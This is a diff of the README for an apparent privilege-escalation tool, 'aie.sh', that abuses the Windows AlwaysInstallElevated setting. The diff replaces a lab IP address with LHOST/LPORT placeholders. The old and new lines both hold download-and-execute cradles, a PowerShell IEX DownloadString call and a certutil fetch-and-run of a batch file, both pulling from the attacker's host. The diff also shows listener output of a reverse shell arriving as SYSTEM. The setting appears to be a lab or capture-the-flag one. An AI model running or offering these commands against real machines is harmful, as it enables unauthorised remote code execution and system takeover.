@@ -105,13 +105,13 @@ Usage: aie.sh -i <ATTACKER_IP> -p <LPORT> [-w <HTTP_PORT>]
 ### Basic usage
 
 ```bash
-./aie.sh -i 10.10.14.27 -p 4444
+./aie.sh -i <LHOST> -p <LPORT>
 ```
 
 ### Custom HTTP port
 
 ```bash
-./aie.sh -i 10.10.14.27 -p 4444 -w 8080
+./aie.sh -i <LHOST> -p <LPORT> -w 8080
 ```
 
 ---
@@ -123,7 +123,7 @@ Once `aie.sh` is running, copy the command it prints and execute it on the targe
 ### With PowerShell available
 
 ```powershell
-powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.27:8005/get-script.ps1')"
+powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:8005/get-script.ps1')"
 ```
 
 What happens on the target:
@@ -137,7 +137,7 @@ What happens on the target:
 ### Without PowerShell (pure CMD)
 
 ```cmd
-certutil -urlcache -split -f "http://10.10.14.27:8005/get-script.bat" "%TEMP%\get-script.bat" && "%TEMP%\get-script.bat"
+certutil -urlcache -split -f "http://<LHOST>:8005/get-script.bat" "%TEMP%\get-script.bat" && "%TEMP%\get-script.bat"
 ```
 
 What happens on the target:
@@ -201,8 +201,8 @@ Both must return `0x1`. If either key is missing or set to `0`, the target is **
   ╔══════════════════════════════════════════════════════╗
   ║              AlwaysInstallElevated → SYSTEM          ║
   ║                                                      ║
-  ║  LHOST : 10.10.14.27                                 ║
-  ║  LPORT : 4444  (reverse shell)                       ║
+  ║  LHOST : <LHOST>                                 ║
+  ║  LPORT : <LPORT>  (reverse shell)                       ║
   ║  HTTP  : 8005                                        ║
   ║  ARCH  : auto-detect (x86 + x64)                    ║
   ╚══════════════════════════════════════════════════════╝
@@ -221,15 +221,15 @@ Both must return `0x1`. If either key is missing or set to `0`, the target is **
 [+] Run one of the following commands on the target:
 
   [WITH PowerShell]:
-  powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.27:8005/get-script.ps1')"
+  powershell -ExecutionPolicy Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>:8005/get-script.ps1')"
 
   [WITHOUT PowerShell - pure CMD]:
-  certutil -urlcache -split -f "http://10.10.14.27:8005/get-script.bat" "%TEMP%\get-script.bat" && "%TEMP%\get-script.bat"
+  certutil -urlcache -split -f "http://<LHOST>:8005/get-script.bat" "%TEMP%\get-script.bat" && "%TEMP%\get-script.bat"
 ==================================================================
 
-[*] Starting listener on port 4444...
-listening on [any] 4444 ...
-connect to [10.10.14.27] from (UNKNOWN) [10.10.10.X] 50212
+[*] Starting listener on port <LPORT>...
+listening on [any] <LPORT> ...
+connect to [<LHOST>] from (UNKNOWN) [10.10.10.X] 50212
 PS C:\WINDOWS\system32> whoami
 nt authority\system
 PS C:\WINDOWS\system32>
